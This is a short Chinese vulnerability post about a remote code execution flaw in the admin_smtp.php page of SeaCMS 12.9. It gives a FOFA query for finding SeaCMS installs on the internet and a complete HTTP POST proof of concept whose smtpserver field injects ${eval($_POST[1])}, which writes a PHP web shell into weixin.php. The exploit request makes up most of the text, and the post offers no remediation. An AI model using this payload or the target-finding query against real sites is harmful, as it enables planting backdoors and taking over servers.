# 海洋CMS后台admin_smtp.php存在远程代码执行漏洞

SeaCMS 12.9存在远程代码执行漏洞。该漏洞是由于admin_smtp.php将用户输入的数据未经处理直接拼接写入weixin.php造成的，允许经过身份验证的攻击者利用该漏洞执行任意命令并获取系统权限。

## fofa

```yaml
app="海洋CMS"
```

## poc

```yaml
POST /at1fcg/admin_smtp.php?action=set HTTP/1.1
Host: 127.0.0.12
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 192
Origin: http://127.0.0.12
Connection: close
Referer: http://127.0.0.12/at1fcg/admin_smtp.php
Cookie: PHPSESSID=rcejd2jps1jcrv8gdoumqmf71k
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: iframe
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=4

smtpserver=${eval($_POST[1])}&smtpserverport=&smtpusermail=12345%40qq.com&smtpname=%E6%B5%B7%E6%B4%8B%E5%BD%B1%E8%A7%86%E7%BD%91&smtpuser=12345%40qq.com&smtppass=123456789&smtpreg=off&smtppsw=
```

![QQ截图20240703085443-3](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407191152600.png)

![](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407191152599.png)